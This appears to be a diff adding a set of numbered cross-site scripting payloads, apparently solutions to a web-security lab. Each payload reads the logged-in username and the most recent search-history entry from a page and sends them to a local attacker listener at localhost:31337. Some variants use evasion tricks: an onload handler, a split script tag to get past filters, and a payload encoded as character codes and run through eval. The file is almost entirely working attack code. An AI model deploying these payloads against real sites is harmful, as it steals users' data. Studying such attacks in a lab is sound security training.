@@ -1,0 +1,50 @@
+<!-- 2.0 -->
+<script>
+    $(function(){
+        let username = document.getElementById("logged-in-user").innerText;
+        let last_search = document.getElementsByClassName("history-item list-group-item").item(0).innerText;
+        let target_url = "http://localhost:31337/?stolen_user=" + username + "&last_search=" + last_search;
+        $.get(target_url, function(data){});
+    });
+</script>
+
+
+
+<!-- 2.1 -->
+<!-- <body onload="(function(){
+    let username = document.getElementById('logged-in-user').innerText;
+    let last_search = document.getElementsByClassName('history-item list-group-item').item(0).innerText;
+    let target_url = 'http://localhost:31337/?stolen_user=' + username + '&last_search=' + last_search;
+    $.get(target_url, function(data){});})();"></body> -->
+
+
+
+<!-- 2.2 -->
+<!-- <scrscriptipt>
+    $(function(){
+        let username = document.getElementById("logged-in-user").innerText;
+        let last_search = document.getElementsByClassName("history-item list-group-item").item(0).innerText;
+        let target_url = "http://localhost:31337/?stolen_user=" + username + "&last_search=" + last_search;
+        $.get(target_url, function(data){});
+    });
+</scrscriptipt> -->
+
+
+
+<!-- 2.3 (get ascii code first, then use eval to execute) -->
+<!-- <script>
+    let code = '$.get("http://localhost:31337/?stolen_user="+document.getElementById("logged-in-user").innerText + "&last_search="+document.getElementsByClassName("history-item list-group-item").item(0).innerText, function(data){})';
+    let result = '';
+    
+    for(let i = 0; i < code.length; i++){
+        result += code[i].charCodeAt() + ',';
+    };
+    
+    console.log(result);
+</script>
+
+<body onload=javascript:eval(String.fromCharCode(36,46,103,101,116,40,34,104,116,116,112,58,47,47,108,111,99,97,108,104,111,115,116,58,51,49,51,51,55,47,63,115,116,111,108,101,110,95,117,115,101,114,61,34,43,100,111,99,117,109,101,110,116,46,103,101,116,69,108,101,109,101,110,116,66,121,73,100,40,34,108,111,103,103,101,100,45,105,110,45,117,115,101,114,34,41,46,105,110,110,101,114,84,101,120,116,32,43,32,34,38,108,97,115,116,95,115,101,97,114,99,104,61,34,43,100,111,99,117,109,101,110,116,46,103,101,116,69,108,101,109,101,110,116,115,66,121,67,108,97,115,115,78,97,109,101,40,34,104,105,115,116,111,114,121,45,105,116,101,109,32,108,105,115,116,45,103,114,111,117,112,45,105,116,101,109,34,41,46,105,116,101,109,40,48,41,46,105,110,110,101,114,84,101,120,116,44,32,102,117,110,99,116,105,111,110,40,100,97,116,97,41,123,125,41))></body> -->
+
+
+
+<!-- 2.4 -->
